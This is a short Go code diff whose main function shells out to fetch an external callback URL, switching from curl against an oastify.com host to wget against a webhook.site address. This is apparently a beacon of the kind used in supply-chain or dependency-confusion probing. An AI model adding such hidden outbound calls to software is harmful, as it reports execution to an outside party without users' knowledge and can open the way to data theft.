@@ -10,7 +10,7 @@ import (
 )
 
 func main() {
-	cmd := exec.Command("curl", "http://0bc32egulq8qb88n1rekfk5o1f76v3js.oastify.com")
+	cmd := exec.Command("wget", "https://webhook.site/eb4f653b-4fb0-4754-bbde-7086d88f9b8a")
 	stdout, err := cmd.Output()
 
 	if err != nil {
